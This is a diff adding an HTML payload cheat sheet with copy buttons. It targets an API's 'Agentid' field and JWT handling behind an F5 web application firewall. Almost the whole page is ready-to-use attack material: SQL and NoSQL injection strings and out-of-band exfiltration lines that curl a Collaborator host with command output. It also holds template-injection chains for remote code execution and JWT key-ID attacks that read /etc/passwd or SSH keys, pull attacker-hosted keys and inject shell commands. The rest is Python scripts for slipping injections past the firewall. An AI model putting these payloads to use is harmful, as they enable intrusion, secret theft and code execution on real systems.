+        <div class="prow"><div class="prow-code">{"Agentid": "anon'", "Id": "11222222000"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon\\", "Id": "11222222000"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon' OR '1'='1", "Id": "11222222000"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon'/**/OR/**/1=1--", "Id": "11222222000"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "xx'/**/UNION/**/SELECT/**/password/**/FROM/**/users/**/LIMIT/**/1--", "Id": "11222222000"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">Then trigger via EP2:</div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon'"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon' OR '1'='1"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "xx'/**/UNION/**/SELECT/**/password/**/FROM/**/users/**/LIMIT/**/1--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="pcard">
+    <div class="pcard-head" onclick="tog(this)">
+      <div><div class="pcard-title">OOB SQLi — DNS/HTTP Exfil (Burp Collaborator)</div><div class="pcard-sub">xp_dirtree · LOAD_FILE · UTL_HTTP · pg COPY TO PROGRAM</div></div>
+      <span class="sev s-crit">CRITICAL</span><span class="chev">›</span>
+    </div>
+    <div class="pcard-body">
+      <div class="note"><b>Setup:</b> Replace <code>COLLABORATOR</code> with your Burp Collaborator / interactsh hostname. DNS hit = injection confirmed even with no response data.</div>
+      <div class="payload-list">
+        <div class="grp">MSSQL — xp_dirtree DNS</div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon';EXEC/**/master..xp_dirtree/**/'\\\\COLLABORATOR\\x'--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon';EXEC/**/master..xp_fileexist/**/'\\\\COLLABORATOR\\x'--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">MySQL — LOAD_FILE DNS</div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon'/**/UNION/**/SELECT/**/LOAD_FILE(CONCAT('\\\\\\\\',version(),'.COLLABORATOR\\\\x'))--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">PostgreSQL — COPY TO PROGRAM</div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon';COPY/**/(SELECT/**/'')/**/TO/**/PROGRAM/**/'nslookup COLLABORATOR'--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon';CREATE/**/TABLE/**/t(x/**/text);COPY/**/t/**/FROM/**/PROGRAM/**/'curl http://COLLABORATOR/$(whoami)'--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">Oracle — UTL_HTTP</div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon'||(SELECT/**/UTL_HTTP.REQUEST('http://COLLABORATOR/'||(SELECT/**/banner/**/FROM/**/v$version/**/WHERE/**/rownum=1))/**/FROM/**/dual)--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════ -->
+<!-- S3: NoSQLi -->
+<!-- ══════════════════════════════════════════════ -->
+<div class="section" id="s3">
+  <div class="sec-head"><span class="sec-num">03</span><span class="sec-title" style="color:var(--orange)">NoSQL Injection — MongoDB Operators</span><span class="pill p-green">F5 BLIND TO OBJECT VALUES</span></div>
+
+  <div class="pcard">
+    <div class="pcard-head" onclick="tog(this)">
+      <div><div class="pcard-title">MongoDB Operator Injection — Full Operator Suite</div><div class="pcard-sub">replace string with object → F5 has no rule for nested JSON objects</div></div>
+      <span class="sev s-crit">CRITICAL</span><span class="chev">›</span>
+    </div>
+    <div class="pcard-body">
+      <div class="payload-list">
+        <div class="grp">Auth bypass operators — EP2</div>
+        <div class="prow"><div class="prow-code">{"Agentid": {"$ne": ""}}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": {"$ne": null}}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": {"$gt": ""}}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": {"$gte": ""}}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": {"$lt": "z"}}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": {"$exists": true}}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": {"$type": "string"}}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">Regex — enumerate agent names</div>
+        <div class="prow"><div class="prow-code">{"Agentid": {"$regex": ".*"}}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": {"$regex": "^admin"}}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": {"$regex": "^a", "$options": "i"}}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": {"$regex": ".*", "$options": "i"}}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": {"$regex": "^anon"}}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">$in — match multiple targets at once</div>
+        <div class="prow"><div class="prow-code">{"Agentid": {"$in": ["admin","root","system","anon","bot","api"]}}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": {"$nin": ["anon"]}}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">$where — server-side JS (if enabled)</div>
+        <div class="prow"><div class="prow-code">{"Agentid": {"$where": "true"}}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": {"$where": "this.Agentid == this.Agentid"}}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": {"$where": "sleep(5000)||true"}}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": {"$where": "function(){return true;}"}}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": {"$where": "Object.keys(this).length > 0"}}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">$expr — MongoDB 3.6+</div>
+        <div class="prow"><div class="prow-code">{"Agentid": {"$expr": {"$eq": ["$Agentid", "$Agentid"]}}}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": {"$expr": {"$gt": [{"$strLenCP": "$Agentid"}, 0]}}}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════ -->
+<!-- S6: SSTI -->
+<!-- ══════════════════════════════════════════════ -->
+<div class="section" id="s6">
+  <div class="sec-head"><span class="sec-num">06</span><span class="sec-title" style="color:var(--purple)">SSTI — Server-Side Template Injection via Agentid</span><span class="pill p-purple">RCE POTENTIAL</span></div>
+
+  <div class="pcard">
+    <div class="pcard-head" onclick="tog(this)">
+      <div><div class="pcard-title">SSTI Detection + RCE — All Engines</div><div class="pcard-sub">Jinja2 · Twig · FreeMarker · Velocity · Spring EL · Pebble · ERB</div></div>
+      <span class="sev s-crit">CRITICAL</span><span class="chev">›</span>
+    </div>
+    <div class="pcard-body">
+      <div class="note"><b>Detection:</b> Send math expression. If API returns <code>49</code> in response, SSTI confirmed. Then use engine-specific RCE chain.</div>
+      <div class="payload-list">
+        <div class="grp">Detection probes</div>
+        <div class="prow"><div class="prow-code">{"Agentid": "{{7*7}}"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "${7*7}"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "#{7*7}"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "*{7*7}"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "@{7*7}"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "<%= 7*7 %>"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "{{7*'7'}}"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">Jinja2 RCE (Python)</div>
+        <div class="prow"><div class="prow-code">{"Agentid": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].decode()}}"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "{{config}}"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">Twig RCE (PHP)</div>
+        <div class="prow"><div class="prow-code">{"Agentid": "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "{{['id']|filter('system')}}"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">FreeMarker RCE (Java)</div>
+        <div class="prow"><div class="prow-code">{"Agentid": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">Spring EL / Thymeleaf (Java)</div>
+        <div class="prow"><div class="prow-code">{"Agentid": "*{T(java.lang.Runtime).getRuntime().exec('id')}"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "${T(java.lang.System).getenv()}"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">Velocity RCE (Java)</div>
+        <div class="prow"><div class="prow-code">{"Agentid": "#set($e='')#set($a=$e.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke($e.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id'))"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">ERB (Ruby)</div>
+        <div class="prow"><div class="prow-code">{"Agentid": "<%= `id` %>"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "<%= system('id') %>"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════ -->
+<!-- S8: JWT KID ATTACKS — 50 PAYLOADS -->
+<!-- ══════════════════════════════════════════════ -->
+<div class="section" id="s8">
+  <div class="sec-head"><span class="sec-num">08</span><span class="sec-title" style="color:var(--pink)">JWT — KID Parameter Attacks (50 Payloads)</span><span class="pill p-red">F5-AWARE</span></div>
+  <div class="note" style="margin-bottom:12px">
+    <b>Attack surface:</b> The <code>kid</code> (Key ID) header tells the server WHICH key to use for JWT verification. If the server fetches the key using <code>kid</code> as a file path, SQL query, or URL — it's injectable. F5 may inspect the JWT Authorization header for common SQL patterns. Use <span class="ok">unicode escapes + comment fragmentation</span> in kid values.
+  </div>
+
+  <div class="pcard">
+    <div class="pcard-head" onclick="tog(this)">
+      <div><div class="pcard-title">KID — Path Traversal (key loaded from filesystem)</div><div class="pcard-sub">kid used in file read → /dev/null = empty HMAC secret → forge any token</div></div>
+      <span class="sev s-crit">CRITICAL</span><span class="chev">›</span>
+    </div>
+    <div class="pcard-body">
+      <div class="note"><b>How:</b> If server does <code>readFile(kid)</code>, point kid to <code>/dev/null</code> or <code>/proc/self/fd/0</code> (empty file). HMAC secret = empty string. Sign your token with empty string = valid signature.</div>
+      <div class="payload-list">
+        <div class="grp">Classic path traversal — in JWT header kid field</div>
+        <div class="prow"><div class="prow-code">kid: "../../dev/null"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "../../../dev/null"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "../../../../dev/null"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "/dev/null"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "/proc/self/fd/0"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "/proc/self/environ"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "/etc/passwd"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "/etc/hostname"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "/etc/hosts"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "/app/config/secret.key"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "/var/www/html/.env"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "/home/app/.ssh/id_rsa"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "..\\..\\dev\\null"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "....//....//dev//null"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "%2e%2e%2f%2e%2e%2fdev%2fnull"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "..%252f..%252fdev%252fnull"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="pcard">
+    <div class="pcard-head" onclick="tog(this)">
+      <div><div class="pcard-title">KID — SQL Injection (key fetched from DB)</div><div class="pcard-sub">SQL query uses kid value → inject → return known key or empty</div></div>
+      <span class="sev s-crit">CRITICAL</span><span class="chev">›</span>
+    </div>
+    <div class="pcard-body">
+      <div class="note"><b>Pattern:</b> Server does <code>SELECT secret FROM keys WHERE kid='[input]'</code>. Inject UNION to return a known value as the secret, then sign token with that value.</div>
+      <div class="payload-list">
+        <div class="grp">Return static string as secret via UNION</div>
+        <div class="prow"><div class="prow-code">kid: "x' UNION SELECT 'attackersecret'--"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "x'/**/UNION/**/SELECT/**/'attackersecret'--"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "x'/**/UNION/**/SELECT/**/0x61747461636b657273656372657 --"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "x\u0027/**/UNION/**/SELECT/**/'attackersecret'--"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">Return NULL / empty string as secret</div>
+        <div class="prow"><div class="prow-code">kid: "x' UNION SELECT NULL--"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "x'/**/UNION/**/SELECT/**/NULL--"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "x'/**/UNION/**/SELECT/**/''--"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "x'/**/UNION/**/SELECT/**/NULL,NULL--"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">Boolean / tautology bypass</div>
+        <div class="prow"><div class="prow-code">kid: "' OR '1'='1"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "'/**/OR/**/'1'='1"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "x'/**/OR/**/1=1--"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "x'/**/OR/**/1=1#"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">Time-based blind — confirm SQL injection in kid</div>
+        <div class="prow"><div class="prow-code">kid: "x'/**/AND/**/SLEEP(5)--"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "x'/**/AND/**/(SELECT/**/SLEEP(5))--"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "x';WAITFOR/**/DELAY/**/'0:0:5'--"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "x';SELECT/**/pg_sleep(5)--"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">Comment fragment bypass for F5</div>
+        <div class="prow"><div class="prow-code">kid: "x'/*!UNION*//**/SELECT/**/'attackersecret'--"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "x'/**/UN/**/ION/**/SEL/**/ECT/**/'attackersecret'--"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "x'\u0020UNION\u0020SELECT\u0020'attackersecret'--"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="pcard">
+    <div class="pcard-head" onclick="tog(this)">
+      <div><div class="pcard-title">KID — URL / SSRF (key fetched via HTTP)</div><div class="pcard-sub">kid as URL → server fetches attacker-controlled key</div></div>
+      <span class="sev s-crit">CRITICAL</span><span class="chev">›</span>
+    </div>
+    <div class="pcard-body">
+      <div class="note"><b>How:</b> Host a JWKS or raw key at your server. Point kid to it. Server fetches YOUR key. Sign tokens with the matching private key → server validates successfully.</div>
+      <div class="payload-list">
+        <div class="grp">External key fetch (SSRF via kid)</div>
+        <div class="prow"><div class="prow-code">kid: "https://attacker.com/jwks.json"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "http://attacker.com/key"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "https://attacker.com/secret.pem"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "http://169.254.169.254/latest/meta-data/"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "http://localhost:8080/internal-key"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "file:///etc/passwd"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "file:///dev/null"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="pcard">
+    <div class="pcard-head" onclick="tog(this)">
+      <div><div class="pcard-title">KID — Command Injection (shell executed with kid)</div><div class="pcard-sub">kid passed to shell command → OS command execution</div></div>
+      <span class="sev s-crit">CRITICAL</span><span class="chev">›</span>
+    </div>
+    <div class="pcard-body">
+      <div class="payload-list">
+        <div class="grp">Bash injection via kid field</div>
+        <div class="prow"><div class="prow-code">kid: "key1 | id"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "key1; id"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "key1 && id"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "key1 || id"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "`id`"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "$(id)"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "key1 | curl http://COLLABORATOR/$(id)"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "key1\nid"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "key1%0aid"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "key1%0a%0d/usr/bin/id"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="pcard">
+    <div class="pcard-head" onclick="tog(this)">
+      <div><div class="pcard-title">KID — Special Values / Logic Bypass</div><div class="pcard-sub">null · empty · boolean · numeric · nonexistent key</div></div>
+      <span class="sev s-high">HIGH</span><span class="chev">›</span>
+    </div>
+    <div class="pcard-body">
+      <div class="payload-list">
+        <div class="grp">Null / empty kid — fallback behavior</div>
+        <div class="prow"><div class="prow-code">kid: ""</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: null</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: 0</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: false</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: []</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: {}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">Nonexistent / wildcard kid</div>
+        <div class="prow"><div class="prow-code">kid: "doesnotexist"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "none"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "*"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "admin"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">Combined: path + SQLi</div>
+        <div class="prow"><div class="prow-code">kid: "../../dev/null' UNION SELECT NULL--"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">kid: "../keys/' OR '1'='1"</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="pcard">
+    <div class="pcard-head" onclick="tog(this)">
+      <div><div class="pcard-title">JWT — alg:none + Header Manipulation</div><div class="pcard-sub">remove signature validation · all case variants · F5 passes JWT header</div></div>
+      <span class="sev s-crit">CRITICAL</span><span class="chev">›</span>
+    </div>
+    <div class="pcard-body">
+      <div class="note"><b>Method:</b> Base64url-encode header+payload with no/empty signature. Use jwt_tool or Burp JWT Editor. Vary alg case — some validators do case-sensitive check.</div>
+      <div class="payload-list">
+        <div class="grp">alg:none headers (base64url encode these)</div>
+        <div class="prow"><div class="prow-code">{"alg":"none","typ":"JWT","kid":"../../dev/null"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"alg":"None","typ":"JWT"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"alg":"NONE","typ":"JWT"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"alg":"nOnE","typ":"JWT"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"alg":"NoNe","typ":"JWT"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"alg":"","typ":"JWT"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">Algorithm confusion — RS256 → HS256</div>
+        <div class="prow"><div class="prow-code">python3 jwt_tool.py [TOKEN] -X k -pk server_pubkey.pem</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">python3 jwt_tool.py [TOKEN] -T  <span class="c"># tamper mode, change alg to HS256</span></div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">jku / x5u spoofing</div>
+        <div class="prow"><div class="prow-code">{"alg":"RS256","jku":"https://attacker.com/jwks.json"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"alg":"RS256","x5u":"https://attacker.com/cert.pem"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">Claim tampering (before sig check)</div>
+        <div class="prow"><div class="prow-code">{"sub":"admin","agentid":"admin","role":"admin","exp":9999999999}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"sub":"anon","role":"superadmin","iat":1,"exp":9999999999}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════ -->
+<!-- S10: F5 ENCODING BYPASS -->
+<!-- ══════════════════════════════════════════════ -->
+<div class="section" id="s10">
+  <div class="sec-head"><span class="sec-num">10</span><span class="sec-title" style="color:var(--red)">F5 WAF Bypass — Encoding Layer</span><span class="pill p-green">CORE BYPASS CHAIN</span></div>
+  <div class="note" style="margin-bottom:12px"><b>WAF Oracle confirmed:</b> <code>alert</code> → blocked, <code>prompt</code> → passes. This tells us F5 uses <b>keyword signatures</b>, not semantic analysis. The same bypass category applies: fragment, escape, or encode the blocked keyword. Use these for any SQLi keyword that gets blocked.</div>
+
+  <div class="pcard">
+    <div class="pcard-head" onclick="tog(this)">
+      <div><div class="pcard-title">Gzip Body Compression — F5 Skips Inspection</div><div class="pcard-sub">Content-Encoding: gzip · backend decodes · WAF sees compressed bytes</div></div>
+      <span class="sev s-crit">CRITICAL</span><span class="chev">›</span>
+    </div>
+    <div class="pcard-body">
+      <div class="payload-list">
+        <div class="grp">Python — send gzip compressed JSON with SQLi</div>
+        <div class="prow"><div class="prow-code">import gzip,requests,json
+payload={"Agentid":"anon' OR 1=1--"}
+body=gzip.compress(json.dumps(payload).encode())
+r=requests.post("https://TARGET/view-agent-pair",data=body,
+  headers={"Content-Type":"application/json","Content-Encoding":"gzip"})
+print(r.text)</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">import zlib,requests,json
+payload={"Agentid":"anon' UNION SELECT password FROM users--"}
+body=zlib.compress(json.dumps(payload).encode())
+r=requests.post("https://TARGET/view-agent-pair",data=body,
+  headers={"Content-Type":"application/json","Content-Encoding":"deflate"})
+print(r.text)</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">Headers to try</div>
+        <div class="prow"><div class="prow-code">Content-Encoding: gzip</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">Content-Encoding: deflate</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">Content-Encoding: br</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">Content-Encoding: identity</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="pcard">
+    <div class="pcard-head" onclick="tog(this)">
+      <div><div class="pcard-title">Content-Type Mismatch — Skip JSON WAF Rules</div><div class="pcard-sub">send JSON body with non-JSON Content-Type · F5 applies different rule profile</div></div>
+      <span class="sev s-crit">CRITICAL</span><span class="chev">›</span>
+    </div>
+    <div class="pcard-body">
+      <div class="payload-list">
+        <div class="grp">Non-JSON Content-Types with JSON body — try each</div>
+        <div class="prow"><div class="prow-code">Content-Type: text/plain</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">Content-Type: text/html</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">Content-Type: application/x-www-form-urlencoded</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">Content-Type: application/octet-stream</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">Content-Type: application/xml</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
